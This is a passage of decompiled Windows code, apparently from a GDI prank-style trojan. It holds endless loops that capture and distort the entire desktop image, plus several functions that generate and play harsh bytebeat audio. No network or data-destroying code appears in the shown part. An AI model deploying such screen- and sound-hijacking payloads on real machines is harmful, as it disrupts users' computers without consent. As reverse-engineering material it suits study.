  local_70.bmiHeader.biClrImportant = 0;
  local_70.bmiColors[0].rgbBlue = '\0';
  local_70.bmiColors[0].rgbGreen = '\0';
  local_70.bmiColors[0].rgbRed = '\0';
  local_70.bmiColors[0].rgbReserved = '\0';
  local_70.bmiHeader.biSizeImage = 0;
  local_70.bmiHeader.biXPelsPerMeter = 0;
  local_70.bmiHeader.biYPelsPerMeter = 0;
  local_70.bmiHeader.biClrUsed = 0;
  local_70.bmiHeader.biPlanes = 1;
  local_70.bmiHeader.biBitCount = 0x20;
  local_70.bmiHeader.biCompression = 0;
  local_94 = hDest;
  local_70.bmiHeader.biWidth = iVar3;
  local_70.bmiHeader.biHeight = hDest;
  h = CreateDIBSection(pHVar2,&local_70,0,&local_a8,(HANDLE)0x0,0);
  pHVar2 = local_98;
  SelectObject(local_98,h);
  local_a0 = 0;
  local_a4 = 0;
  local_9c = 8;
  do {
    local_84 = GetDC((HWND)0x0);
    StretchBlt(pHVar2,0,0,iVar3,hDest,local_84,0,0,iVar3,hDest,0xcc0020);
    local_90 = 0;
    if (0 < iVar3) {
      do {
        iVar3 = local_90;
        iVar5 = 0;
        if (0 < hDest) {
          uVar6 = local_a0 ^ 8;
          dVar8 = (double)local_90 + 24.0;
          libm_sse2_sin_precise();
          local_88 = local_8c << 2;
          iVar3 = iVar3 << 2;
          local_78 = dVar8 * (double)local_a4;
          do {
            fVar7 = (float10)cbrt((double)iVar5 - 32.0);
            iVar5 = iVar5 + 1;
            dStack_80 = (double)fVar7;
            pcVar1 = (char *)(iVar3 + 2 + (int)local_a8);
            cVar4 = (char)(int)(dStack_80 * (double)local_9c + (double)(int)uVar6 + (double)local_a4
                               + local_78);
            *pcVar1 = *pcVar1 - cVar4;
            pcVar1 = (char *)(iVar3 + 1 + (int)local_a8);
            *pcVar1 = *pcVar1 - cVar4;
            *(char *)(iVar3 + (int)local_a8) = *(char *)(iVar3 + (int)local_a8) - cVar4;
            iVar3 = iVar3 + local_88;
            hDest = local_94;
          } while (iVar5 < local_94);
        }
        local_90 = local_90 + 1;
        iVar3 = local_8c;
      } while (local_90 < local_8c);
    }
    pHVar2 = local_84;
    local_a0 = local_a0 + 1;
    local_9c = local_9c + -1;
    local_a4 = local_a4 + 4;
    StretchBlt(local_84,0,0,iVar3,hDest,local_98,0,0,iVar3,hDest,0x1100a6);
    ReleaseDC((HWND)0x0,pHVar2);
    DeleteDC(pHVar2);
    pHVar2 = local_98;
  } while( true );
}



void FUN_00402cd0(void)

{
  int *piVar1;
  HDC pHVar2;
  int iVar3;
  HBITMAP h;
  int iVar4;
  int cx;
  int iVar5;
  double dVar6;
  double dVar7;
  double dVar8;
  void *local_54;
  HDC local_50;
  int local_4c;
  int local_48;
  float local_44;
  float local_40;
  HDC local_3c;
  BITMAPINFO local_38;
  uint local_c;
  
  local_c = DAT_00408000 ^ (uint)&local_54;
  pHVar2 = GetDC((HWND)0x0);
  local_50 = CreateCompatibleDC(pHVar2);
  local_4c = GetSystemMetrics(0);
  iVar3 = GetSystemMetrics(1);
  cx = local_4c;
  local_54 = (void *)0x0;
  local_38.bmiHeader.biClrImportant = 0;
  local_38.bmiColors[0].rgbBlue = '\0';
  local_38.bmiColors[0].rgbGreen = '\0';
  local_38.bmiColors[0].rgbRed = '\0';
  local_38.bmiColors[0].rgbReserved = '\0';
  local_38.bmiHeader.biCompression = 0;
  local_38.bmiHeader.biSizeImage = 0;
  local_38.bmiHeader.biXPelsPerMeter = 0;
  local_38.bmiHeader.biYPelsPerMeter = 0;
  local_38.bmiHeader.biClrUsed = 0;
  local_38.bmiHeader.biSize = 0x2c;
  local_38.bmiHeader.biPlanes = 1;
  local_38.bmiHeader.biBitCount = 0x20;
  local_38.bmiHeader.biWidth = local_4c;
  local_48 = iVar3;
  local_38.bmiHeader.biHeight = iVar3;
  h = CreateDIBSection(pHVar2,&local_38,0,&local_54,(HANDLE)0x0,0);
  SelectObject(local_50,h);
  iVar5 = iVar3 * cx;
  local_44 = 2.5 / (float)cx;
  local_40 = 1.9 / (float)iVar3;
  do {
    pHVar2 = GetDC((HWND)0x0);
    local_3c = pHVar2;
    BitBlt(local_50,0,0,cx,local_48,pHVar2,0,0,0xcc0020);
    cx = local_4c;
    iVar3 = 0;
    if (0 < iVar5) {
      do {
        dVar7 = 0.0;
        dVar6 = 0.0;
        iVar4 = 0;
        do {
          if (0x31 < iVar4) break;
          iVar4 = iVar4 + 1;
          *(char *)((int)local_54 + iVar3 * 4) = (char)iVar4;
          dVar8 = dVar6 * dVar6;
          piVar1 = (int *)((int)local_54 + iVar3 * 4);
          *piVar1 = *piVar1 + -0x29a;
          dVar6 = dVar7 * 3.0 * dVar6 +
                  ((double)local_40 * (double)(iVar3 / local_4c) - 0.949999988079071);
          dVar7 = (dVar7 * dVar7 - dVar8) + ((double)local_44 * (double)(iVar3 % local_4c) - 2.0);
        } while (dVar6 * dVar6 + dVar7 * dVar7 < 10.0);
        iVar3 = iVar3 + 1;
        pHVar2 = local_3c;
      } while (iVar3 < iVar5);
    }
    BitBlt(pHVar2,0,0,local_4c,local_48,local_50,0,0,0xcc0020);
    ReleaseDC((HWND)0x0,pHVar2);
    DeleteDC(pHVar2);
  } while( true );
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie

void FUN_00402ed0(void)

{
  uint uVar1;
  double dVar2;
  wavehdr_tag wStack_50c44;
  HWAVEOUT pHStack_50c24;
  WAVEFORMATEX WStack_50c20;
  CHAR aCStack_50c0c [330760];
  
  pHStack_50c24 = (HWAVEOUT)0x0;
  WStack_50c20.cbSize = 0;
  WStack_50c20.wFormatTag = 1;
  WStack_50c20.nChannels = 1;
  WStack_50c20.nSamplesPerSec = 0x2b11;
  WStack_50c20.nAvgBytesPerSec = 0x2b11;
  WStack_50c20.nBlockAlign = 1;
  WStack_50c20.wBitsPerSample = 8;
  waveOutOpen(&pHStack_50c24,0xffffffff,&WStack_50c20,0,0,0);
  memset(aCStack_50c0c,0,0x50bfe);
  uVar1 = 0;
  do {
    dVar2 = (double)(uVar1 >> 10) + 0.0;
    libm_sse2_tan_precise();
    aCStack_50c0c[uVar1] =
         (CHAR)(int)(dVar2 * ((double)(uVar1 % 0x58) + 0.0) + (double)(uVar1 % 0xb0) + 0.0 +
                     (double)(uVar1 % 0x2c) + 0.0 + (double)(uVar1 % 0x160) + 0.0);
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x50bfe);
  wStack_50c44.lpData = aCStack_50c0c;
  wStack_50c44.dwBufferLength = 0x50bfe;
  wStack_50c44.dwBytesRecorded = 0;
  wStack_50c44.dwUser = 0;
  wStack_50c44.dwFlags = 0;
  wStack_50c44.dwLoops = 0;
  wStack_50c44.lpNext = (wavehdr_tag *)0x0;
  wStack_50c44.reserved = 0;
  waveOutPrepareHeader(pHStack_50c24,&wStack_50c44,0x20);
  waveOutWrite(pHStack_50c24,&wStack_50c44,0x20);
  waveOutUnprepareHeader(pHStack_50c24,&wStack_50c44,0x20);
  waveOutClose(pHStack_50c24);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie

void FUN_004030f0(void)

{
  uint uVar1;
  double dVar2;
  wavehdr_tag wStack_a1844;
  HWAVEOUT pHStack_a1824;
  WAVEFORMATEX WStack_a1820;
  byte abStack_a180c [661512];
  
  pHStack_a1824 = (HWAVEOUT)0x0;
  WStack_a1820.cbSize = 0;
  WStack_a1820.wFormatTag = 1;
  WStack_a1820.nChannels = 1;
  WStack_a1820.nSamplesPerSec = 0x5622;
  WStack_a1820.nAvgBytesPerSec = 0x5622;
  WStack_a1820.nBlockAlign = 1;
  WStack_a1820.wBitsPerSample = 8;
  waveOutOpen(&pHStack_a1824,0xffffffff,&WStack_a1820,0,0,0);
  memset(abStack_a180c,0,0xa17fc);
  uVar1 = 0;
  do {
    dVar2 = (double)(uVar1 >> 5) + 0.0;
    libm_sse2_sin_precise();
    abStack_a180c[uVar1] = (byte)(int)(dVar2 * ((double)(uVar1 >> 9) + 0.0)) ^ (byte)uVar1;
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0xa17fc);
  wStack_a1844.lpData = (LPSTR)abStack_a180c;
  wStack_a1844.dwBufferLength = 0xa17fc;
  wStack_a1844.dwBytesRecorded = 0;
  wStack_a1844.dwUser = 0;
  wStack_a1844.dwFlags = 0;
  wStack_a1844.dwLoops = 0;
  wStack_a1844.lpNext = (wavehdr_tag *)0x0;
  wStack_a1844.reserved = 0;
  waveOutPrepareHeader(pHStack_a1824,&wStack_a1844,0x20);
  waveOutWrite(pHStack_a1824,&wStack_a1844,0x20);
  waveOutUnprepareHeader(pHStack_a1824,&wStack_a1844,0x20);
  waveOutClose(pHStack_a1824);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403280(void)

{
  undefined1 auVar1 [32];
  undefined1 auVar2 [32];
  char cVar3;
  uint uVar4;
  uint uVar5;
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  uint uVar11;
  uint uVar12;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  undefined1 auVar13 [16];
  undefined1 auVar14 [16];
  undefined1 auVar15 [16];
  wavehdr_tag wStack_50c54;
  uint uStack_50c34;
  HWAVEOUT pHStack_50c30;
  undefined1 auStack_50c2c [20];
  uint auStack_50c18 [82690];
  
  pHStack_50c30 = (HWAVEOUT)0x0;
  auStack_50c2c._16_2_ = 0;
  auStack_50c2c._0_2_ = 1;
  auStack_50c2c._2_2_ = 1;
  auStack_50c2c._4_4_ = 0x2b11;
  auStack_50c2c._8_4_ = 0x2b11;
  auStack_50c2c._12_2_ = 1;
  auStack_50c2c._14_2_ = 8;
  waveOutOpen(&pHStack_50c30,0xffffffff,(LPCWAVEFORMATEX)auStack_50c2c,0,0,0);
  memset(auStack_50c18,0,0x50bfe);
  uVar4 = 0;
  if (5 < DAT_004083c8) {
    uVar5 = 4;
    uVar12 = uVar4;
    do {
      uVar4 = uVar12 + 8;
      uVar16 = uVar12 + 1;
      auVar6._4_4_ = uVar16;
      auVar6._0_4_ = uVar12;
      uVar17 = uVar12 + 2;
      uVar18 = uVar12 + 3;
      auVar6._8_4_ = uVar17;
      auVar6._12_4_ = uVar18;
      auVar8 = pshufb(auVar6,_DAT_004068c0);
      auVar10._0_4_ = uVar12 >> 6;
      auVar10._4_4_ = uVar16 >> 6;
      auVar10._8_4_ = uVar17 >> 6;
      auVar10._12_4_ = uVar18 >> 6;
      auVar1 = vpmovzxbw_avx2(ZEXT416(0x6060606));
      auVar10 = pshufb(auVar10,_DAT_004068c0);
      uVar11 = CONCAT13(-auVar8[3],CONCAT12(-auVar8[2],CONCAT11(-auVar8[1],-auVar8[0]))) &
               auVar10._0_4_;
      auVar2 = vpmovzxbw_avx2(auVar8);
      auVar1 = vpmullw_avx2(auVar2,auVar1);
      auVar6 = vpmovwb_avx512vl(auVar1);
      auVar7._0_4_ = uVar12 >> 9;
      auVar7._4_4_ = uVar16 >> 9;
      auVar7._8_4_ = uVar17 >> 9;
      auVar7._12_4_ = uVar18 >> 9;
      auVar13._0_4_ = uVar12 >> 3;
      auVar13._4_4_ = uVar16 >> 3;
      auVar13._8_4_ = uVar17 >> 3;
      auVar13._12_4_ = uVar18 >> 3;
      auVar7 = pshufb(auVar7,_DAT_004068c0);
      auVar14 = pshufb(auVar13,_DAT_004068c0);
      uVar16 = uVar5 + 1;
      auVar9._4_4_ = uVar16;
      auVar9._0_4_ = uVar5;
      uVar17 = uVar5 + 2;
      uVar18 = uVar5 + 3;
      *(uint *)(auStack_50c2c + uVar5 + 0x10) =
           (CONCAT13((char)(uVar11 >> 0x18) + auVar8[3],
                     CONCAT12((char)(uVar11 >> 0x10) + auVar8[2],
                              CONCAT11((char)(uVar11 >> 8) + auVar8[1],(char)uVar11 + auVar8[0]))) ^
           auVar6._0_4_ & auVar10._0_4_) & auVar7._0_4_ | auVar14._0_4_;
      auVar9._8_4_ = uVar17;
      auVar9._12_4_ = uVar18;
      auVar14._0_4_ = uVar5 >> 6;
      auVar14._4_4_ = uVar16 >> 6;
      auVar14._8_4_ = uVar17 >> 6;
      auVar14._12_4_ = uVar18 >> 6;
      auVar9 = pshufb(auVar9,_DAT_004068c0);
      auVar10 = pshufb(auVar14,_DAT_004068c0);
      auVar1 = vpmovzxbw_avx2(ZEXT416(0x6060606));
      uVar12 = CONCAT13(-auVar9[3],CONCAT12(-auVar9[2],CONCAT11(-auVar9[1],-auVar9[0]))) &
               auVar10._0_4_;
      auVar2 = vpmovzxbw_avx2(auVar9);
      auVar1 = vpmullw_avx2(auVar2,auVar1);
      auVar6 = vpmovwb_avx512vl(auVar1);
      auVar8._0_4_ = uVar5 >> 9;
      auVar8._4_4_ = uVar16 >> 9;
      auVar8._8_4_ = uVar17 >> 9;
      auVar8._12_4_ = uVar18 >> 9;
      auVar15._0_4_ = uVar5 >> 3;
      auVar15._4_4_ = uVar16 >> 3;
      auVar15._8_4_ = uVar17 >> 3;
      auVar15._12_4_ = uVar18 >> 3;
      auVar7 = pshufb(auVar8,_DAT_004068c0);
      auVar8 = pshufb(auVar15,_DAT_004068c0);
      *(uint *)((int)auStack_50c18 + uVar5) =
           (CONCAT13((char)(uVar12 >> 0x18) + auVar9[3],
                     CONCAT12((char)(uVar12 >> 0x10) + auVar9[2],
                              CONCAT11((char)(uVar12 >> 8) + auVar9[1],(char)uVar12 + auVar9[0]))) ^
           auVar6._0_4_ & auVar10._0_4_) & auVar7._0_4_ | auVar8._0_4_;
      uVar5 = uVar5 + 8;
      uVar12 = uVar4;
    } while (uVar5 < 0x50bfc);
    if (0x50bfd < uVar4) goto LAB_00403493;
  }
  do {
    cVar3 = (char)uVar4;
    uStack_50c34 = uVar4 >> 6;
    *(byte *)((int)auStack_50c18 + uVar4) =
         ((-cVar3 & (byte)uStack_50c34) + cVar3 ^ cVar3 * '\x06' & (byte)uStack_50c34) &
         (byte)(uVar4 >> 9) | (byte)(uVar4 >> 3);
    uVar4 = uVar4 + 1;
  } while (uVar4 < 0x50bfe);
LAB_00403493:
  wStack_50c54.lpData = (LPSTR)auStack_50c18;
  wStack_50c54.dwBufferLength = 0x50bfe;
  wStack_50c54.dwBytesRecorded = 0;
  wStack_50c54.dwUser = 0;
  wStack_50c54.dwFlags = 0;
  wStack_50c54.dwLoops = 0;
  wStack_50c54.lpNext = (wavehdr_tag *)0x0;
  wStack_50c54.reserved = 0;
  waveOutPrepareHeader(pHStack_50c30,&wStack_50c54,0x20);
  waveOutWrite(pHStack_50c30,&wStack_50c54,0x20);
  waveOutUnprepareHeader(pHStack_50c30,&wStack_50c54,0x20);
  waveOutClose(pHStack_50c30);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403550(void)

{
  undefined1 auVar1 [32];
  undefined1 auVar2 [32];
  uint uVar3;
  uint uVar4;
  undefined1 auVar5 [16];
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  undefined1 auVar14 [16];
  undefined1 auVar15 [16];
  undefined1 auVar16 [16];
  wavehdr_tag wStack_50c50;
  HWAVEOUT pHStack_50c30;
  undefined1 auStack_50c2c [20];
  CHAR aCStack_50c18 [4];
  undefined4 auStack_50c14 [82689];
  
  pHStack_50c30 = (HWAVEOUT)0x0;
  auStack_50c2c._16_2_ = 0;
  auStack_50c2c._0_2_ = 1;
  auStack_50c2c._2_2_ = 1;
  auStack_50c2c._4_4_ = 0x2b11;
  auStack_50c2c._8_4_ = 0x2b11;
  auStack_50c2c._12_2_ = 1;
  auStack_50c2c._14_2_ = 8;
  waveOutOpen(&pHStack_50c30,0xffffffff,(LPCWAVEFORMATEX)auStack_50c2c,0,0,0);
  memset(aCStack_50c18,0,0x50bfe);
  uVar3 = 0;
  if (5 < DAT_004083c8) {
    uVar4 = 4;
    do {
      auVar11._4_4_ = uVar3 + 1;
      auVar11._0_4_ = uVar3;
      auVar11._8_4_ = uVar3 + 2;
      auVar11._12_4_ = uVar3 + 3;
      auVar5._0_4_ = uVar3 >> 10;
      auVar5._4_4_ = uVar3 + 1 >> 10;
      auVar5._8_4_ = uVar3 + 2 >> 10;
      auVar5._12_4_ = uVar3 + 3 >> 10;
      auVar12 = pshufb(auVar11,_DAT_004068c0);
      auVar5 = pshufb(auVar5,_DAT_004068c0);
      auVar14._8_4_ = auVar5._8_4_ & auVar12._8_4_;
      auVar14._12_4_ = auVar5._12_4_ & auVar12._12_4_;
      auVar14._0_8_ =
           CONCAT44(auVar5._4_4_ & auVar12._4_4_,auVar5._0_4_ & auVar12._0_4_) ^ 0xa0a0a0a;
      auVar1 = vpmovzxbw_avx2(auVar14);
      auVar2 = vpmovzxbw_avx2(auVar12);
      auVar1 = vpmullw_avx2(auVar1,auVar2);
      auVar5 = vpmovwb_avx512vl(auVar1);
      *(int *)(auStack_50c2c + uVar4 + 0x10) = auVar5._0_4_;
      auVar13._4_4_ = uVar4 + 1;
      auVar13._0_4_ = uVar4;
      auVar13._8_4_ = uVar4 + 2;
      auVar13._12_4_ = uVar4 + 3;
      auVar12._0_4_ = uVar4 >> 10;
      auVar12._4_4_ = uVar4 + 1 >> 10;
      auVar12._8_4_ = uVar4 + 2 >> 10;
      auVar12._12_4_ = uVar4 + 3 >> 10;
      auVar14 = pshufb(auVar13,_DAT_004068c0);
      auVar5 = pshufb(auVar12,_DAT_004068c0);
      auVar6._8_4_ = auVar5._8_4_ & auVar14._8_4_;
      auVar6._12_4_ = auVar5._12_4_ & auVar14._12_4_;
      auVar6._0_8_ = CONCAT44(auVar5._4_4_ & auVar14._4_4_,auVar5._0_4_ & auVar14._0_4_) ^ 0xa0a0a0a
      ;
      auVar1 = vpmovzxbw_avx2(auVar6);
      auVar2 = vpmovzxbw_avx2(auVar14);
      auVar1 = vpmullw_avx2(auVar1,auVar2);
      auVar5 = vpmovwb_avx512vl(auVar1);
      *(int *)(aCStack_50c18 + uVar4) = auVar5._0_4_;
      uVar4 = uVar4 + 0x10;
      auVar15._4_4_ = uVar3 + 9;
      auVar15._0_4_ = uVar3 + 8;
      auVar15._8_4_ = uVar3 + 10;
      auVar15._12_4_ = uVar3 + 0xb;
      auVar7._0_4_ = uVar3 + 8 >> 10;
      auVar7._4_4_ = uVar3 + 9 >> 10;
      auVar7._8_4_ = uVar3 + 10 >> 10;
      auVar7._12_4_ = uVar3 + 0xb >> 10;
      auVar14 = pshufb(auVar15,_DAT_004068c0);
      auVar5 = pshufb(auVar7,_DAT_004068c0);
      auVar8._8_4_ = auVar5._8_4_ & auVar14._8_4_;
      auVar8._12_4_ = auVar5._12_4_ & auVar14._12_4_;
      auVar8._0_8_ = CONCAT44(auVar5._4_4_ & auVar14._4_4_,auVar5._0_4_ & auVar14._0_4_) ^ 0xa0a0a0a
      ;
      auVar1 = vpmovzxbw_avx2(auVar8);
      auVar2 = vpmovzxbw_avx2(auVar14);
      auVar1 = vpmullw_avx2(auVar1,auVar2);
      auVar5 = vpmovwb_avx512vl(auVar1);
      *(int *)((int)auStack_50c14 + uVar3 + 4) = auVar5._0_4_;
      auVar16._4_4_ = uVar3 + 0xd;
      auVar16._0_4_ = uVar3 + 0xc;
      auVar16._8_4_ = uVar3 + 0xe;
      auVar16._12_4_ = uVar3 + 0xf;
      auVar9._0_4_ = uVar3 + 0xc >> 10;
      auVar9._4_4_ = uVar3 + 0xd >> 10;
      auVar9._8_4_ = uVar3 + 0xe >> 10;
      auVar9._12_4_ = uVar3 + 0xf >> 10;
      auVar14 = pshufb(auVar16,_DAT_004068c0);
      auVar5 = pshufb(auVar9,_DAT_004068c0);
      auVar10._8_4_ = auVar5._8_4_ & auVar14._8_4_;
      auVar10._12_4_ = auVar5._12_4_ & auVar14._12_4_;
      auVar10._0_8_ =
           CONCAT44(auVar5._4_4_ & auVar14._4_4_,auVar5._0_4_ & auVar14._0_4_) ^ 0xa0a0a0a;
      auVar1 = vpmovzxbw_avx2(auVar10);
      auVar2 = vpmovzxbw_avx2(auVar14);
      auVar1 = vpmullw_avx2(auVar1,auVar2);
      auVar5 = vpmovwb_avx512vl(auVar1);
      *(int *)((int)auStack_50c14 + uVar3 + 8) = auVar5._0_4_;
      uVar3 = uVar3 + 0x10;
    } while (uVar4 < 0x50bf4);
    if (0x50bfd < uVar3) goto LAB_00403777;
  }
  do {
    aCStack_50c18[uVar3] = ((byte)(uVar3 >> 10) & (byte)uVar3 ^ 10) * (byte)uVar3;
    uVar3 = uVar3 + 1;
  } while (uVar3 < 0x50bfe);
LAB_00403777:
  wStack_50c50.lpData = aCStack_50c18;
  wStack_50c50.dwBufferLength = 0x50bfe;
  wStack_50c50.dwBytesRecorded = 0;
  wStack_50c50.dwUser = 0;
  wStack_50c50.dwFlags = 0;
  wStack_50c50.dwLoops = 0;
  wStack_50c50.lpNext = (wavehdr_tag *)0x0;
  wStack_50c50.reserved = 0;
  waveOutPrepareHeader(pHStack_50c30,&wStack_50c50,0x20);
  waveOutWrite(pHStack_50c30,&wStack_50c50,0x20);
  waveOutUnprepareHeader(pHStack_50c30,&wStack_50c50,0x20);
  waveOutClose(pHStack_50c30);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie

void FUN_00403830(void)

{
  uint uVar1;
  uint uVar2;
  wavehdr_tag wStack_3a9c4;
  HWAVEOUT pHStack_3a9a4;
  WAVEFORMATEX WStack_3a9a0;
  byte abStack_3a98c [240008];
  
  pHStack_3a9a4 = (HWAVEOUT)0x0;
  WStack_3a9a0.cbSize = 0;
  WStack_3a9a0.wFormatTag = 1;
  WStack_3a9a0.nChannels = 1;
  WStack_3a9a0.nSamplesPerSec = 8000;
  WStack_3a9a0.nAvgBytesPerSec = 8000;
  WStack_3a9a0.nBlockAlign = 1;
  WStack_3a9a0.wBitsPerSample = 8;
  waveOutOpen(&pHStack_3a9a4,0xffffffff,&WStack_3a9a0,0,0,0);
  memset(abStack_3a98c,0,240000);
  uVar1 = 0;
  do {
    uVar2 = uVar1 & 0xc;
    if (uVar2 != 0) {
      abStack_3a98c[uVar1] = (byte)((uVar1 / uVar2) * uVar1 >> 3) & (byte)(-uVar1 / uVar2);
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 240000);
  wStack_3a9c4.lpData = (LPSTR)abStack_3a98c;
  wStack_3a9c4.dwBufferLength = 240000;
  wStack_3a9c4.dwBytesRecorded = 0;
  wStack_3a9c4.dwUser = 0;
  wStack_3a9c4.dwFlags = 0;
  wStack_3a9c4.dwLoops = 0;
  wStack_3a9c4.lpNext = (wavehdr_tag *)0x0;
  wStack_3a9c4.reserved = 0;
  waveOutPrepareHeader(pHStack_3a9a4,&wStack_3a9c4,0x20);
  waveOutWrite(pHStack_3a9a4,&wStack_3a9c4,0x20);
  waveOutUnprepareHeader(pHStack_3a9a4,&wStack_3a9c4,0x20);
  waveOutClose(pHStack_3a9a4);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie

void FUN_004039a0(void)

{
  uint uVar1;
  wavehdr_tag wStack_50c44;
  HWAVEOUT pHStack_50c24;
  WAVEFORMATEX WStack_50c20;
  byte abStack_50c0c [330760];
  
  pHStack_50c24 = (HWAVEOUT)0x0;
  WStack_50c20.cbSize = 0;
  WStack_50c20.wFormatTag = 1;
  WStack_50c20.nChannels = 1;
  WStack_50c20.nSamplesPerSec = 0x2b11;
  WStack_50c20.nAvgBytesPerSec = 0x2b11;
  WStack_50c20.nBlockAlign = 1;
  WStack_50c20.wBitsPerSample = 8;
  waveOutOpen(&pHStack_50c24,0xffffffff,&WStack_50c20,0,0,0);
  memset(abStack_50c0c,0,0x50bfe);
  uVar1 = 0;
  do {
    if ((uVar1 & 0xfff) != 0) {
      abStack_50c0c[uVar1] =
           ((byte)(uVar1 >> 8) | (char)uVar1 << 3) + (char)(40000 / (ulonglong)(uVar1 & 0xfff)) |
           ((byte)(((uVar1 >> 0xb) * 0x1e0 + -0x21c0) * uVar1 >> 5) & 0x87) * '\x7f';
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x50bfe);
  wStack_50c44.lpData = (LPSTR)abStack_50c0c;
  wStack_50c44.dwBufferLength = 0x50bfe;
  wStack_50c44.dwBytesRecorded = 0;
  wStack_50c44.dwUser = 0;
  wStack_50c44.dwFlags = 0;
  wStack_50c44.dwLoops = 0;
  wStack_50c44.lpNext = (wavehdr_tag *)0x0;
  wStack_50c44.reserved = 0;
  waveOutPrepareHeader(pHStack_50c24,&wStack_50c44,0x20);
  waveOutWrite(pHStack_50c24,&wStack_50c44,0x20);
  waveOutUnprepareHeader(pHStack_50c24,&wStack_50c44,0x20);
  waveOutClose(pHStack_50c24);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403b30(void)

{
  byte bVar1;
  undefined1 auVar2 [32];
  undefined1 auVar3 [32];
  uint uVar4;
  uint uVar5;
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  uint uVar9;
  uint uVar19;
  uint uVar20;
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  uint uVar21;
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  undefined1 auVar14 [16];
  undefined1 auVar15 [16];
  undefined1 auVar16 [16];
  undefined1 auVar17 [16];
  undefined1 auVar18 [16];
  wavehdr_tag wStack_50c54;
  uint uStack_50c34;
  HWAVEOUT pHStack_50c30;
  undefined1 auStack_50c2c [20];
  CHAR aCStack_50c18 [4];
  undefined4 auStack_50c14 [82689];
  
  pHStack_50c30 = (HWAVEOUT)0x0;
  auStack_50c2c._16_2_ = 0;
  auStack_50c2c._0_2_ = 1;
  auStack_50c2c._2_2_ = 1;
  auStack_50c2c._4_4_ = 0x2b11;
  auStack_50c2c._8_4_ = 0x2b11;
  auStack_50c2c._12_2_ = 1;
  auStack_50c2c._14_2_ = 8;
  waveOutOpen(&pHStack_50c30,0xffffffff,(LPCWAVEFORMATEX)auStack_50c2c,0,0,0);
  memset(aCStack_50c18,0,0x50bfe);
  uVar4 = 0;
  if (5 < DAT_004083c8) {
    uVar5 = 4;
    do {
      auVar6._4_4_ = uVar4 + 1;
      auVar6._0_4_ = uVar4;
      auVar6._8_4_ = uVar4 + 2;
      auVar6._12_4_ = uVar4 + 3;
      auVar2 = vpmovzxbw_avx2(ZEXT416(0x3030303));
      auVar10._0_4_ = uVar4 >> 8;
      auVar10._4_4_ = uVar4 + 1 >> 8;
      auVar10._8_4_ = uVar4 + 2 >> 8;
      auVar10._12_4_ = uVar4 + 3 >> 8;
      auVar7 = pshufb(auVar6,_DAT_004068c0);
      auVar11 = pshufb(auVar10,_DAT_004068c0);
      auVar3 = vpmovzxbw_avx2(auVar7);
      auVar2 = vpmullw_avx2(auVar3,auVar2);
      auVar6 = vpmovwb_avx512vl(auVar2);
      uVar9 = auVar11._0_4_ ^ auVar6._0_4_;
      uVar19 = auVar11._4_4_ ^ auVar6._4_4_;
      uVar20 = auVar11._8_4_ ^ auVar6._8_4_;
      uVar21 = auVar11._12_4_ ^ auVar6._12_4_;
      auVar12[0] = (char)uVar9 + auVar7[0];
      auVar12[1] = (char)(uVar9 >> 8) + auVar7[1];
      auVar12[2] = (char)(uVar9 >> 0x10) + auVar7[2];
      auVar12[3] = (char)(uVar9 >> 0x18) + auVar7[3];
      auVar12[4] = (char)uVar19 + auVar7[4];
      auVar12[5] = (char)(uVar19 >> 8) + auVar7[5];
      auVar12[6] = (char)(uVar19 >> 0x10) + auVar7[6];
      auVar12[7] = (char)(uVar19 >> 0x18) + auVar7[7];
      auVar12[8] = (char)uVar20 + auVar7[8];
      auVar12[9] = (char)(uVar20 >> 8) + auVar7[9];
      auVar12[10] = (char)(uVar20 >> 0x10) + auVar7[10];
      auVar12[0xb] = (char)(uVar20 >> 0x18) + auVar7[0xb];
      auVar12[0xc] = (char)uVar21 + auVar7[0xc];
      auVar12[0xd] = (char)(uVar21 >> 8) + auVar7[0xd];
      auVar12[0xe] = (char)(uVar21 >> 0x10) + auVar7[0xe];
      auVar12[0xf] = (char)(uVar21 >> 0x18) + auVar7[0xf];
      auVar2 = vpmovzxbw_avx2(auVar12);
      auVar3 = vpmovzxbw_avx2(ZEXT416(0x5050505));
      auVar2 = vpmullw_avx2(auVar2,auVar3);
      auVar6 = vpmovwb_avx512vl(auVar2);
      *(int *)(auStack_50c2c + uVar5 + 0x10) = auVar6._0_4_;
      auVar7._4_4_ = uVar5 + 1;
      auVar7._0_4_ = uVar5;
      auVar7._8_4_ = uVar5 + 2;
      auVar7._12_4_ = uVar5 + 3;
      auVar2 = vpmovzxbw_avx2(ZEXT416(0x3030303));
      auVar13._0_4_ = uVar5 >> 8;
      auVar13._4_4_ = uVar5 + 1 >> 8;
      auVar13._8_4_ = uVar5 + 2 >> 8;
      auVar13._12_4_ = uVar5 + 3 >> 8;
      auVar7 = pshufb(auVar7,_DAT_004068c0);
